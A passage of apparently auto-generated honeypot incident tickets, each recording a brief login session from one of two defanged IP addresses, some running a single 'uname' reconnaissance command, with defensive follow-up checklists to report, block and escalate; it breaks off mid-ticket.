| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 18:54 |
| **Last Seen** | 2026-08-21 18:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:54:10` | `cowrie.session.connect` |
| `2026-08-21 18:54:11` | `cowrie.telnet.option` |
| `2026-08-21 18:54:12` | `cowrie.telnet.option` |
| `2026-08-21 18:54:12` | `cowrie.login.success` |
| `2026-08-21 18:54:13` | `cowrie.session.params` |
| `2026-08-21 18:54:13` | `cowrie.log.closed` |
| `2026-08-21 18:54:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25bf6f8454dd

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 18:54 |
| **Last Seen** | 2026-08-21 18:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:54:13` | `cowrie.session.connect` |
| `2026-08-21 18:54:13` | `cowrie.telnet.option` |
| `2026-08-21 18:54:14` | `cowrie.telnet.option` |
| `2026-08-21 18:54:14` | `cowrie.login.success` |
| `2026-08-21 18:54:15` | `cowrie.session.params` |
| `2026-08-21 18:54:15` | `cowrie.log.closed` |
| `2026-08-21 18:54:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86c9975142ee

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]216` |
| **First Seen** | 2026-08-21 18:54 |
| **Last Seen** | 2026-08-21 18:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:54:13` | `cowrie.session.connect` |
| `2026-08-21 18:54:13` | `cowrie.client.version` |
| `2026-08-21 18:54:13` | `cowrie.client.kex` |
| `2026-08-21 18:54:14` | `cowrie.login.success` |
| `2026-08-21 18:54:14` | `cowrie.session.params` |
| `2026-08-21 18:54:14` | `cowrie.command.input` |
| `2026-08-21 18:54:15` | `cowrie.log.closed` |
| `2026-08-21 18:54:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]216` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-348476519e28

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 18:54 |
| **Last Seen** | 2026-08-21 18:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:54:15` | `cowrie.session.connect` |
| `2026-08-21 18:54:16` | `cowrie.telnet.option` |
| `2026-08-21 18:54:16` | `cowrie.telnet.option` |
| `2026-08-21 18:54:16` | `cowrie.login.success` |
| `2026-08-21 18:54:17` | `cowrie.session.params` |
| `2026-08-21 18:54:17` | `cowrie.log.closed` |
| `2026-08-21 18:54:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee9d24399f86

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]216` |
| **First Seen** | 2026-08-21 18:54 |
| **Last Seen** | 2026-08-21 18:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:54:17` | `cowrie.session.connect` |
| `2026-08-21 18:54:17` | `cowrie.client.version` |
| `2026-08-21 18:54:17` | `cowrie.client.kex` |
| `2026-08-21 18:54:18` | `cowrie.login.success` |
| `2026-08-21 18:54:18` | `cowrie.session.params` |
| `2026-08-21 18:54:18` | `cowrie.command.input` |
| `2026-08-21 18:54:19` | `cowrie.log.closed` |
| `2026-08-21 18:54:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]216` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d74284bf85cd

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 18:54 |
| **Last Seen** | 2026-08-21 18:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:54:17` | `cowrie.session.connect` |
| `2026-08-21 18:54:18` | `cowrie.telnet.option` |
| `2026-08-21 18:54:18` | `cowrie.telnet.option` |
| `2026-08-21 18:54:18` | `cowrie.login.success` |
| `2026-08-21 18:54:19` | `cowrie.session.params` |
| `2026-08-21 18:54:19` | `cowrie.log.closed` |
| `2026-08-21 18:54:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-094361323dc9

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 18:54 |
| **Last Seen** | 2026-08-21 18:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:54:19` | `cowrie.session.connect` |
| `2026-08-21 18:54:20` | `cowrie.telnet.option` |
| `2026-08-21 18:54:20` | `cowrie.telnet.option` |
| `2026-08-21 18:54:20` | `cowrie.login.success` |
| `2026-08-21 18:54:21` | `cowrie.session.params` |
| `2026-08-21 18:54:21` | `cowrie.log.closed` |
| `2026-08-21 18:54:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62e7dfffefae

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]216` |
| **First Seen** | 2026-08-21 18:54 |
| **Last Seen** | 2026-08-21 18:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:54:20` | `cowrie.session.connect` |
| `2026-08-21 18:54:20` | `cowrie.client.version` |
| `2026-08-21 18:54:21` | `cowrie.client.kex` |
| `2026-08-21 18:54:21` | `cowrie.login.success` |
| `2026-08-21 18:54:22` | `cowrie.session.params` |
| `2026-08-21 18:54:22` | `cowrie.command.input` |
| `2026-08-21 18:54:22` | `cowrie.log.closed` |
| `2026-08-21 18:54:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]216` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c67991b73140

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 18:54 |
| **Last Seen** | 2026-08-21 18:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:54:21` | `cowrie.session.connect` |
| `2026-08-21 18:54:22` | `cowrie.telnet.option` |
| `2026-08-21 18:54:23` | `cowrie.telnet.option` |
| `2026-08-21 18:54:23` | `cowrie.login.success` |
| `2026-08-21 18:54:23` | `cowrie.session.params` |
| `2026-08-21 18:54:23` | `cowrie.log.closed` |
| `2026-08-21 18:54:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d2d4e5c0b43

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 18:54 |
| **Last Seen** | 2026-08-21 18:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:54:23` | `cowrie.session.connect` |
| `2026-08-21 18:54:24` | `cowrie.telnet.option` |
| `2026-08-21 18:54:25` | `cowrie.telnet.option` |
| `2026-08-21 18:54:25` | `cowrie.login.success` |
| `2026-08-21 18:54:25` | `cowrie.session.params` |
| `2026-08-21 18:54:25` | `cowrie.log.closed` |
| `2026-08-21 18:54:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08edea785e1c

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]216` |
| **First Seen** | 2026-08-21 18:54 |
| **Last Seen** | 2026-08-21 18:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:54:24` | `cowrie.session.connect` |
| `2026-08-21 18:54:24` | `cowrie.client.version` |
| `2026-08-21 18:54:24` | `cowrie.client.kex` |
| `2026-08-21 18:54:24` | `cowrie.login.success` |
| `2026-08-21 18:54:25` | `cowrie.session.params` |
| `2026-08-21 18:54:25` | `cowrie.command.input` |
| `2026-08-21 18:54:25` | `cowrie.log.closed` |
| `2026-08-21 18:54:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]216` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64aaa31df433

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 18:54 |
| **Last Seen** | 2026-08-21 18:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:54:25` | `cowrie.session.connect` |
| `2026-08-21 18:54:26` | `cowrie.telnet.option` |
| `2026-08-21 18:54:27` | `cowrie.telnet.option` |
| `2026-08-21 18:54:27` | `cowrie.login.success` |
| `2026-08-21 18:54:27` | `cowrie.session.params` |
| `2026-08-21 18:54:27` | `cowrie.log.closed` |
| `2026-08-21 18:54:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1626b094beda

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]216` |
| **First Seen** | 2026-08-21 18:54 |
| **Last Seen** | 2026-08-21 18:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:54:27` | `cowrie.session.connect` |
| `2026-08-21 18:54:27` | `cowrie.client.version` |
| `2026-08-21 18:54:28` | `cowrie.client.kex` |
| `2026-08-21 18:54:28` | `cowrie.login.success` |
| `2026-08-21 18:54:29` | `cowrie.session.params` |
| `2026-08-21 18:54:29` | `cowrie.command.input` |
| `2026-08-21 18:54:29` | `cowrie.log.closed` |
| `2026-08-21 18:54:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]216` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e638402d17d

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 18:54 |
| **Last Seen** | 2026-08-21 18:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:54:27` | `cowrie.session.connect` |
| `2026-08-21 18:54:28` | `cowrie.telnet.option` |
| `2026-08-21 18:54:29` | `cowrie.telnet.option` |
| `2026-08-21 18:54:29` | `cowrie.login.success` |
| `2026-08-21 18:54:29` | `cowrie.session.params` |
| `2026-08-21 18:54:29` | `cowrie.log.closed` |
| `2026-08-21 18:54:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32d7f7aa5ef9

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 18:54 |
| **Last Seen** | 2026-08-21 18:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:54:29` | `cowrie.session.connect` |
| `2026-08-21 18:54:30` | `cowrie.telnet.option` |
| `2026-08-21 18:54:31` | `cowrie.telnet.option` |
| `2026-08-21 18:54:31` | `cowrie.login.success` |
| `2026-08-21 18:54:31` | `cowrie.session.params` |
| `2026-08-21 18:54:31` | `cowrie.log.closed` |
| `2026-08-21 18:54:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7bea5cf5440

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]216` |
| **First Seen** | 2026-08-21 18:54 |
| **Last Seen** | 2026-08-21 18:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:54:31` | `cowrie.session.connect` |
| `2026-08-21 18:54:31` | `cowrie.client.version` |
| `2026-08-21 18:54:31` | `cowrie.client.kex` |
| `2026-08-21 18:54:32` | `cowrie.login.success` |
| `2026-08-21 18:54:32` | `cowrie.session.params` |
| `2026-08-21 18:54:32` | `cowrie.command.input` |
| `2026-08-21 18:54:32` | `cowrie.log.closed` |
| `2026-08-21 18:54:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]216` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-604e0197a925

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 18:54 |
| **Last Seen** | 2026-08-21 18:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:54:31` | `cowrie.session.connect` |
| `2026-08-21 18:54:32` | `cowrie.telnet.option` |
| `2026-08-21 18:54:33` | `cowrie.telnet.option` |
| `2026-08-21 18:54:33` | `cowrie.login.success` |
| `2026-08-21 18:54:34` | `cowrie.session.params` |
| `2026-08-21 18:54:34` | `cowrie.log.closed` |
| `2026-08-21 18:54:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01d461a1131c

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 18:54 |
| **Last Seen** | 2026-08-21 18:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:54:34` | `cowrie.session.connect` |
| `2026-08-21 18:54:34` | `cowrie.telnet.option` |
| `2026-08-21 18:54:35` | `cowrie.telnet.option` |
| `2026-08-21 18:54:35` | `cowrie.login.success` |
| `2026-08-21 18:54:36` | `cowrie.session.params` |
| `2026-08-21 18:54:36` | `cowrie.log.closed` |
| `2026-08-21 18:54:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a420ff97234

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]216` |
| **First Seen** | 2026-08-21 18:54 |
| **Last Seen** | 2026-08-21 18:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:54:34` | `cowrie.session.connect` |
| `2026-08-21 18:54:34` | `cowrie.client.version` |
| `2026-08-21 18:54:34` | `cowrie.client.kex` |
| `2026-08-21 18:54:34` | `cowrie.login.success` |
| `2026-08-21 18:54:35` | `cowrie.session.params` |
| `2026-08-21 18:54:35` | `cowrie.command.input` |
| `2026-08-21 18:54:36` | `cowrie.log.closed` |
| `2026-08-21 18:54:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]216` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c242711674a9

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 18:54 |
| **Last Seen** | 2026-08-21 18:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:54:36` | `cowrie.session.connect` |
| `2026-08-21 18:54:37` | `cowrie.telnet.option` |
| `2026-08-21 18:54:37` | `cowrie.telnet.option` |
| `2026-08-21 18:54:37` | `cowrie.login.success` |
| `2026-08-21 18:54:38` | `cowrie.session.params` |
| `2026-08-21 18:54:38` | `cowrie.log.closed` |
| `2026-08-21 18:54:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a239bd883625

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]216` |
| **First Seen** | 2026-08-21 18:54 |
| **Last Seen** | 2026-08-21 18:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:54:38` | `cowrie.session.connect` |
| `2026-08-21 18:54:38` | `cowrie.client.version` |
| `2026-08-21 18:54:38` | `cowrie.client.kex` |
| `2026-08-21 18:54:38` | `cowrie.login.success` |
| `2026-08-21 18:54:39` | `cowrie.session.params` |
| `2026-08-21 18:54:39` | `cowrie.command.input` |
| `2026-08-21 18:54:39` | `cowrie.log.closed` |
| `2026-08-21 18:54:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]216` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a08eb609f2a6

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 18:54 |
| **Last Seen** | 2026-08-21 18:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:54:38` | `cowrie.session.connect` |
| `2026-08-21 18:54:39` | `cowrie.telnet.option` |
| `2026-08-21 18:54:40` | `cowrie.telnet.option` |
| `2026-08-21 18:54:40` | `cowrie.login.success` |
| `2026-08-21 18:54:40` | `cowrie.session.params` |
| `2026-08-21 18:54:40` | `cowrie.log.closed` |
| `2026-08-21 18:54:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15757e6613ec

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 18:54 |
| **Last Seen** | 2026-08-21 18:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:54:40` | `cowrie.session.connect` |
| `2026-08-21 18:54:41` | `cowrie.telnet.option` |
| `2026-08-21 18:54:42` | `cowrie.telnet.option` |
| `2026-08-21 18:54:42` | `cowrie.login.success` |
| `2026-08-21 18:54:42` | `cowrie.session.params` |
| `2026-08-21 18:54:42` | `cowrie.log.closed` |
| `2026-08-21 18:54:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cb0667d39fa

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]216` |
| **First Seen** | 2026-08-21 18:54 |
| **Last Seen** | 2026-08-21 18:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:54:41` | `cowrie.session.connect` |
| `2026-08-21 18:54:41` | `cowrie.client.version` |
| `2026-08-21 18:54:42` | `cowrie.client.kex` |
| `2026-08-21 18:54:42` | `cowrie.login.success` |
| `2026-08-21 18:54:43` | `cowrie.session.params` |
| `2026-08-21 18:54:43` | `cowrie.command.input` |
| `2026-08-21 18:54:43` | `cowrie.log.closed` |
| `2026-08-21 18:54:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]216` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33750b2084d3

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 18:54 |
| **Last Seen** | 2026-08-21 18:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:54:42` | `cowrie.session.connect` |
| `2026-08-21 18:54:43` | `cowrie.telnet.option` |
| `2026-08-21 18:54:44` | `cowrie.telnet.option` |
| `2026-08-21 18:54:44` | `cowrie.login.success` |
| `2026-08-21 18:54:44` | `cowrie.session.params` |
| `2026-08-21 18:54:44` | `cowrie.log.closed` |
| `2026-08-21 18:54:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02207beabc51

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 18:54 |
| **Last Seen** | 2026-08-21 18:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:54:44` | `cowrie.session.connect` |
| `2026-08-21 18:54:45` | `cowrie.telnet.option` |
| `2026-08-21 18:54:46` | `cowrie.telnet.option` |
| `2026-08-21 18:54:46` | `cowrie.login.success` |
| `2026-08-21 18:54:46` | `cowrie.session.params` |
| `2026-08-21 18:54:46` | `cowrie.log.closed` |
| `2026-08-21 18:54:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a9248651e2a

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]216` |
| **First Seen** | 2026-08-21 18:54 |
| **Last Seen** | 2026-08-21 18:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:54:45` | `cowrie.session.connect` |
| `2026-08-21 18:54:45` | `cowrie.client.version` |
| `2026-08-21 18:54:45` | `cowrie.client.kex` |
| `2026-08-21 18:54:46` | `cowrie.login.success` |
| `2026-08-21 18:54:47` | `cowrie.session.params` |
| `2026-08-21 18:54:47` | `cowrie.command.input` |
| `2026-08-21 18:54:47` | `cowrie.log.closed` |
| `2026-08-21 18:54:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]216` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-452e18bef6dc

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 18:54 |
| **Last Seen** | 2026-08-21 18:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:54:47` | `cowrie.session.connect` |
| `2026-08-21 18:54:48` | `cowrie.telnet.option` |
| `2026-08-21 18:54:48` | `cowrie.telnet.option` |
| `2026-08-21 18:54:48` | `cowrie.login.success` |
| `2026-08-21 18:54:49` | `cowrie.session.params` |
| `2026-08-21 18:54:49` | `cowrie.log.closed` |
| `2026-08-21 18:54:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-332a64aeb84b

| Field | Detail |
|---|---|
